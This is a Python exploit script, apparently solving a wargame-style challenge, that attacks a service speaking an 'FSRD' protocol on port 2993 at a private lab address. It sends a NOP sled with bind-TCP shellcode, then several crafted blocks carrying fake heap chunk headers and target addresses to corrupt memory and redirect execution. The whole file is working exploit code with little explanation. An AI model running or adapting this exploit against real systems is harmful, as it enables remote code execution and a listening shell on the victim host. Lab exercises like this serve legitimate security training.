#!/usr/bin/env python3
import struct
import sys
import socket
from time import sleep
from pwnpy.pwn import *

dest = ('10.10.10.4', 2993)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(dest)

print('Sending first block')
buf = b'FSRD'
buf += b'\x90'*30
buf += make_bind_tcp()
buf = buf.ljust(126, b'\x90')
buf += b'\xcc'
buf += b'/'
s.send(buf)

print('Sending second block')
buf = b'FSRD'
buf += b'ROOT/'
buf += struct.pack('I', 0xfffffffc)
buf += struct.pack('I', 0xfffffffc)
buf += struct.pack('I', 0x804e020 - 0xc) # Aprox pointer to shellcode 0xc metadata
#b'AAAA' #Changes this
buf += struct.pack('I', 0x804d41c - 0x8) # Where to copy
#buf += b'BBBB'
buf += b'\x00'
buf = buf.ljust(127, b'Z')
buf += b'/'
s.send(buf)

print('Sending third block')
buf = b'FSRD'
buf += b'ROOT/'
buf += struct.pack('I', 0xfffffff4)
buf += struct.pack('I', 0x89)
buf += b'CCCC'
buf += b'DDDD'
buf += b'\x00'
buf = buf.ljust(127, b'Y')
buf += b'/'
s.send(buf)

print('Sending fourth block')
buf = b'FSRD'
buf += b'ROOT/'
buf += struct.pack('I', 0xfffffffc)
buf += struct.pack('I', 0xfffffffc)
buf += b'EEEE'
buf += b'FFFF'
buf += b'\x00'
buf = buf.ljust(128, b'X')
s.send(buf)

print('Sending end')
buf = b'END'
s.send(buf)

#for i in range(7):
#    print('Sending {}'.format(i))
#    buf = b'FSRD'
#    buf += b'/ROOT/un/path/de/mierda/%d/' % i
#    buf = buf.ljust(128, b'A')
#    s.send(buf)
#    #sleep(1)
#    #print(s.recv(128))
#else:
#    s.send(b'FSRD'.ljust(128, b'A'))
#    s.send(b'AAA')

print(s.recv(128))

